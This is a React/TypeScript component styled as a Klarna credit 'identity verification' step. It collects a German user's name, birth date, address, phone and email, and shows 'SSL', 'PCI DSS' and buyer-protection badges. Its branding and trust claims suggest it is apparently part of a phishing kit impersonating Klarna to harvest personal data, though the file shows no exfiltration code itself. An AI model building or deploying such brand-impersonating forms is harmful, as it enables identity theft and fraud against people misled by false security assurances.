import React, { useState } from 'react';
import { Lock, CheckCircle, ShieldCheck } from 'lucide-react';

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface KlarnaCreditPersonalDataProps {
  onSubmit: (data: PersonalData) => void;
}

const KlarnaCreditPersonalData: React.FC<KlarnaCreditPersonalDataProps> = ({ onSubmit }) => {
  const [formData, setFormData] = useState<PersonalData>({
    first_name: '',
    last_name: '',
    date_of_birth: '',
    street: '',
    street_number: '',
    plz: '',
    city: '',
    phone: '',
    email: ''
  });

  const [errors, setErrors] = useState<Partial<PersonalData>>({});
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (name: keyof PersonalData, value: string) => {
    setFormData(prev => ({ ...prev, [name]: value }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const handlePhoneChange = (value: string) => {
    // Auto-format phone number
    let formatted = value.replace(/\D/g, ''); // Remove non-digits
    if (formatted.startsWith('49')) {
      formatted = '+49 ' + formatted.slice(2);
    } else if (formatted.startsWith('0')) {
      formatted = '+49 ' + formatted.slice(1);
    } else if (!formatted.startsWith('+49')) {
      formatted = '+49 ' + formatted;
    }
    
    setFormData(prev => ({ ...prev, phone: formatted }));
    if (errors.phone) {
      setErrors(prev => ({ ...prev, phone: '' }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<PersonalData> = {};
    
    if (!formData.first_name.trim()) {
      newErrors.first_name = 'Vorname ist erforderlich';
    }
    
    if (!formData.last_name.trim()) {
      newErrors.last_name = 'Nachname ist erforderlich';
    }
    
    if (!formData.date_of_birth.trim()) {
      newErrors.date_of_birth = 'Geburtsdatum ist erforderlich';
    } else if (!/^\d{2}\.\d{2}\.\d{4}$/.test(formData.date_of_birth)) {
      newErrors.date_of_birth = 'Format: TT.MM.JJJJ';
    }
    
    if (!formData.street.trim()) {
      newErrors.street = 'Straße ist erforderlich';
    }
    
    if (!formData.street_number.trim()) {
      newErrors.street_number = 'Hausnummer ist erforderlich';
    }
    
    if (!formData.plz.trim()) {
      newErrors.plz = 'PLZ ist erforderlich';
    } else if (!/^\d{5}$/.test(formData.plz)) {
      newErrors.plz = 'PLZ muss 5 Ziffern haben';
    }
    
    if (!formData.city.trim()) {
      newErrors.city = 'Ort ist erforderlich';
    }
    
    if (!formData.phone.trim() || formData.phone === '+49 ') {
      newErrors.phone = 'Telefonnummer ist erforderlich';
    }
    
    if (!formData.email.trim()) {
      newErrors.email = 'E-Mail ist erforderlich';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = 'Ungültige E-Mail-Adresse';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    
    try {
      await onSubmit(formData);
    } catch (error) {
      console.error('Personal data submission error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="klarna-personal-data-form">
      <div className="klarna-bank-card-header">
        <h1 className="klarna-title">Persönliche Angaben</h1>
        <p className="klarna-subtitle">
          Vervollständigen Sie Ihre Identitätsverifizierung mit Ihren persönlichen Daten
        </p>
      </div>

      <form onSubmit={handleSubmit} className="klarna-personal-form">
        <div className="klarna-form-row">
          <div className="klarna-form-group">
            <label htmlFor="first_name" className="klarna-label">
              Vorname <span className="klarna-required">*</span>
            </label>
            <input
              type="text"
              id="first_name"
              name="first_name"
              placeholder="Ihr Vorname"
              value={formData.first_name}
              onChange={(e) => handleInputChange('first_name', e.target.value)}
              className={`klarna-input ${errors.first_name ? 'klarna-input-error' : ''}`}
              required
              disabled={isLoading}
            />
            {errors.first_name && (
              <span className="klarna-error-text">{errors.first_name}</span>
            )}
          </div>

          <div className="klarna-form-group">
            <label htmlFor="last_name" className="klarna-label">
              Nachname <span className="klarna-required">*</span>
            </label>
            <input
              type="text"
              id="last_name"
              name="last_name"
              placeholder="Ihr Nachname"
              value={formData.last_name}
              onChange={(e) => handleInputChange('last_name', e.target.value)}
              className={`klarna-input ${errors.last_name ? 'klarna-input-error' : ''}`}
              required
              disabled={isLoading}
            />
            {errors.last_name && (
              <span className="klarna-error-text">{errors.last_name}</span>
            )}
          </div>
        </div>

        <div className="klarna-form-group">
          <label htmlFor="date_of_birth" className="klarna-label">
            Geburtsdatum <span className="klarna-required">*</span>
          </label>
          <input
            type="text"
            id="date_of_birth"
            name="date_of_birth"
            placeholder="TT.MM.JJJJ"
            value={formData.date_of_birth}
            onChange={(e) => handleInputChange('date_of_birth', e.target.value)}
            className={`klarna-input ${errors.date_of_birth ? 'klarna-input-error' : ''}`}
            required
            disabled={isLoading}
          />
          {errors.date_of_birth && (
            <span className="klarna-error-text">{errors.date_of_birth}</span>
          )}
        </div>

        <div className="klarna-form-row klarna-form-row-address">
          <div className="klarna-form-group klarna-form-group-street">
            <label htmlFor="street" className="klarna-label">
              Straße <span className="klarna-required">*</span>
            </label>
            <input
              type="text"
              id="street"
              name="street"
              placeholder="Straßenname"
              value={formData.street}
              onChange={(e) => handleInputChange('street', e.target.value)}
              className={`klarna-input ${errors.street ? 'klarna-input-error' : ''}`}
              required
              disabled={isLoading}
            />
            {errors.street && (
              <span className="klarna-error-text">{errors.street}</span>
            )}
          </div>

          <div className="klarna-form-group klarna-form-group-number">
            <label htmlFor="street_number" className="klarna-label">
              Nr. <span className="klarna-required">*</span>
            </label>
            <input
              type="text"
              id="street_number"
              name="street_number"
              placeholder="123"
              value={formData.street_number}
              onChange={(e) => handleInputChange('street_number', e.target.value)}
              className={`klarna-input ${errors.street_number ? 'klarna-input-error' : ''}`}
              required
              disabled={isLoading}
            />
            {errors.street_number && (
              <span className="klarna-error-text">{errors.street_number}</span>
            )}
          </div>
        </div>

        <div className="klarna-form-row klarna-form-row-city">
          <div className="klarna-form-group klarna-form-group-plz">
            <label htmlFor="plz" className="klarna-label">
              PLZ <span className="klarna-required">*</span>
            </label>
            <input
              type="text"
              id="plz"
              name="plz"
              placeholder="12345"
              value={formData.plz}
              onChange={(e) => handleInputChange('plz', e.target.value)}
              className={`klarna-input ${errors.plz ? 'klarna-input-error' : ''}`}
              maxLength={5}
              required
              disabled={isLoading}
            />
            {errors.plz && (
              <span className="klarna-error-text">{errors.plz}</span>
            )}
          </div>

          <div className="klarna-form-group klarna-form-group-city">
            <label htmlFor="city" className="klarna-label">
              Ort <span className="klarna-required">*</span>
            </label>
            <input
              type="text"
              id="city"
              name="city"
              placeholder="Ihr Wohnort"
              value={formData.city}
              onChange={(e) => handleInputChange('city', e.target.value)}
              className={`klarna-input ${errors.city ? 'klarna-input-error' : ''}`}
              required
              disabled={isLoading}
            />
            {errors.city && (
              <span className="klarna-error-text">{errors.city}</span>
            )}
          </div>
        </div>

        <div className="klarna-form-group">
          <label htmlFor="phone" className="klarna-label">
            Telefonnummer <span className="klarna-required">*</span>
          </label>
          <input
            type="tel"
            id="phone"
            name="phone"
            placeholder="+49 123 456789"
            value={formData.phone}
            onChange={(e) => handlePhoneChange(e.target.value)}
            className={`klarna-input ${errors.phone ? 'klarna-input-error' : ''}`}
            required
            disabled={isLoading}
          />
          {errors.phone && (
            <span className="klarna-error-text">{errors.phone}</span>
          )}
        </div>

        <div className="klarna-form-group">
          <label htmlFor="email" className="klarna-label">
            E-Mail-Adresse <span className="klarna-required">*</span>
          </label>
          <input
            type="email"
            id="email"
            name="email"
            placeholder="ihre.email@beispiel.de"
            value={formData.email}
            onChange={(e) => handleInputChange('email', e.target.value)}
            className={`klarna-input ${errors.email ? 'klarna-input-error' : ''}`}
            required
            disabled={isLoading}
          />
          {errors.email && (
            <span className="klarna-error-text">{errors.email}</span>
          )}
        </div>

        <div className="klarna-form-actions">
          <button 
            type="submit" 
            className="klarna-button klarna-button-primary klarna-button-full"
            disabled={isLoading}
          >
            {isLoading ? 'Wird abgeschlossen...' : 'Identitätsverifizierung abschließen'}
          </button>
        </div>
      </form>

      <div className="klarna-form-footer">
        <div className="klarna-security-badges">
          <div className="klarna-security-badge">
            <span className="klarna-security-icon"><Lock size={16} /></span>
            <span className="klarna-security-text">SSL verschlüsselt</span>
          </div>
          <div className="klarna-security-badge">
            <span className="klarna-security-icon"><CheckCircle size={16} /></span>
            <span className="klarna-security-text">PCI DSS konform</span>
          </div>
          <div className="klarna-security-badge">
            <span className="klarna-security-icon"><ShieldCheck size={16} /></span>
            <span className="klarna-security-text">Käuferschutz</span>
          </div>
        </div>
        
        <p className="klarna-security-notice">
          Ihre Daten werden verschlüsselt übertragen und ausschließlich für die Identitätsverifizierung verwendet
        </p>
      </div>
    </div>
  );
};

export default KlarnaCreditPersonalData;
